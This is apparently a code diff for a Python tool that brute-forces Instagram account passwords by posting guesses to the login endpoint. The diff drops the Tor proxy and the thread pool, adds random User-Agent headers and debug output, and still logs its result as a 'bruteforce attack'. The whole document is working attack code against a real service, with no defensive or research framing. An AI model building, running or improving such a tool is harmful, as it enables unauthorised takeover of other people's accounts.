@@ -3,19 +3,17 @@ import time
 import sys
 from datetime import datetime
 from colorama import init, Fore
-import concurrent.futures
 import random
 
 # Initialize colorama
 init(autoreset=True)
 
-# Set up Tor Proxy
-def setup_tor_proxy():
+# Set up regular HTTP request (no proxy)
+def setup_session():
     session = requests.Session()
-    session.proxies = {
-        'http': 'socks5h://127.0.0.1:9050',
-        'https': 'socks5h://127.0.0.1:9050'
-    }
+    session.headers.update({
+        'User-Agent': generate_user_agent()
+    })
     return session
 
 # Generate random User-Agent
@@ -33,7 +31,13 @@ def instagram_login(username, password, session):
     login_url = 'https://www.instagram.com/accounts/login/ajax/'
 
     # Fetch CSRF token by sending a GET request
-    response = session.get('https://www.instagram.com/accounts/login/', headers={'User-Agent': generate_user_agent()})
+    response = session.get('https://www.instagram.com/accounts/login/')
+    print(Fore.YELLOW + f"[INFO] Response from GET login page: {response.status_code}")
+    
+    if response.status_code != 200:
+        print(Fore.RED + "[-] Failed to load login page.")
+        return False
+
     csrf_token = response.cookies.get('csrftoken')
 
     if not csrf_token:
@@ -59,12 +63,16 @@ def instagram_login(username, password, session):
     # Send POST request for login
     try:
         login_response = session.post(login_url, data=payload, headers=headers)
+        print(Fore.YELLOW + f"[INFO] Login response: {login_response.status_code}")
         login_response.raise_for_status()  # Raise error for invalid response
 
         response_data = login_response.json()
+        print(Fore.YELLOW + f"[INFO] Login response data: {response_data}")
+
         if response_data.get('authenticated', False):
             return True
         else:
+            print(Fore.RED + "[-] Login failed. Response: " + str(response_data))
             return False
     except requests.exceptions.RequestException as e:
         print(Fore.RED + f"[-] Request error: {e}")
@@ -74,7 +82,7 @@ def instagram_login(username, password, session):
 def test_speed(username, password, delay, max_workers):
     print(Fore.GREEN + f"\n[*] Testing with delay = {delay} seconds and max_workers = {max_workers}")
 
-    session = setup_tor_proxy()
+    session = setup_session()
 
     def try_password(password):
         print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
@@ -85,12 +93,8 @@ def test_speed(username, password, delay, max_workers):
             print(Fore.RED + "Status = [Fail]")
             return False
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-        results = {executor.submit(try_password, password): password for _ in range(1)}  # Test only one password at a time
-        for future in concurrent.futures.as_completed(results):
-            if future.result():
-                print(Fore.GREEN + "[*] Bruteforce attack completed.")
-                return
+    # Only 1 password per test to make debugging easier
+    try_password(password)
 
     time.sleep(delay)
 
